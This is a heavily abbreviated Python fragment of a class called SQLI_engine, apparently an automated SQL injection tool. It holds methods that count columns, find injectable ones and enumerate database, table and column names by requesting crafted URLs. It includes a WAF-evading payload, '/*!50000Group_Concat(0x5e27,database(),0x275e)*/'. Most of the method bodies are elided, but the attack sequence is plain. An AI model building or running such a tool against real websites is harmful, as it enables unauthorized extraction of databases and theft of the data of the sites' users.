...
class SQLI_engine:
    ...
    def find_all_columns(self):
        ...
        url = self.base_url + self.wizard_string
    ...
    def find_vul_columns(self):
        ...
        for i in range(1, self.all_columns + 1):
            ...
            res = urllib.urlopen(self.base_url + ttemp).read()
    ...
    def get_db(self):
        ...
        for i in range(1, self.all_columns + 1):
            ...
            if counter == 0:
                ...
                self.helper[counter] += param + str(i)
        res = urllib.urlopen(
            self.helper[0] + "/*!50000Group_Concat(0x5e27,database(),0x275e)*/" + self.helper[1]).read()
    ...
    def get_tables(self):
        ...
        #retturn table names
        return self.find_variables(urllib.urlopen(part1 + part2).read())
    ...
    def get_columns(self, table):
        ...
        #get html source
        res = urllib.urlopen(part1 + part2).read()
